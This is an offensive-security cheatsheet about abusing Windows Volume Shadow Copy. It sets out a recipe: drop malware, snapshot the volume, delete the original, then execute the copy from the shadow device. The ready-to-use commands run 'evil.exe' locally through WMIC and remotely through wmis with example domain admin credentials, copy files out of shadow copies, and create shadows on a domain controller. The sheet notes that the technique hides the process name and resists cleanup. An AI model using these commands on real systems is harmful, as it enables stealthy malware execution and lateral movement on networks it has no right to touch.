---
id: cd46b09b-f279-450c-87a1-6f71343f223a
name: Volume Shadow Copy
type: cheatsheet
verified: false
created_at: '2020-07-14T18:21:24.560481+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Volume Shadow Copy

# Description

VSC is a Windows service that’s constantly running and takes snapshots of system directories

To exploit it: Drop Malware -> Create VSC (ReadOnly) -> Delete Malware -> Use WMIC to run VSC of malware

**Code**: [[
HKLM\System\CurrentControlSet\Control\BackupResto]]

# VSSADMIN – native windows utility

**Command** ([[vssadmin create command only applies to Server OS (Win2k3,2008)]]):

```bash
vssadmin list shadows
vssadmin create shadow /for=C:
wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin create shadow /for=C
mklink /D C:\VscAccess \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy1
copy \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy4\path\to\some\file e:\files

```

**Command** ([[Use WMIC process call to run an .exe from a Volume Shadow Copy]]):

```bash
wmic process call create \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\evil.exe

```

This process will not show the image name (executable filename) or command line parameters in the task list.

The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it.

**Command** ([[Execute VSC malware remotely]]):

```bash
wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //ServerName \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\evil.exe

```
